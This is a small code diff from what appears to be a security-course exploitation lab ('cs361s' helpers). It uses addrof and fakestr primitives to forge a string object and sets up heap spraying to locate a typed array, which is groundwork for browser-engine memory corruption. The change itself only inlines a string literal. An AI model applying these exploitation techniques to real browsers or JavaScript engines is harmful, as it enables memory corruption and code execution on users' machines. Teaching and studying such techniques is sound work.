@@ -3,8 +3,7 @@
  */
 
 let dataPlane = new Uint32Array(1);
-let toy = "\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00";
-let fakedStr = cs361s.fakestr(cs361s.addrof(toy) + 16);
+let fakedStr = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00") + 16);
 
 // use heap spraying to find the address of a typed array in range of fakedstr length
 let heapArray = new Uint32Array(72);
